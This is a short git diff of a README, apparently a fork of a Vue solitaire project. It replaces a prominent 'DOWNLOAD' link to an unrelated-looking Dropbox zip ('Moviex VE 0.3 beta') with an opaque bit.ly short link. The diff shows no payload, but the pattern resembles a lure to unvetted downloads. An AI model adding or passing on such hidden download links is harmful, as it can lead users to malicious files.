@@ -17,7 +17,7 @@
 
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
-<h1 align="center"><a  href="https://www.dropbox.com/s/dur1dwt12d3h3tg/Moviex%20VE%200.3%20beta.zip?dl=0">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://bit.ly/3rzScpO">DOWNLOAD</a></h1>
 ## Description
 
 <p align="center">
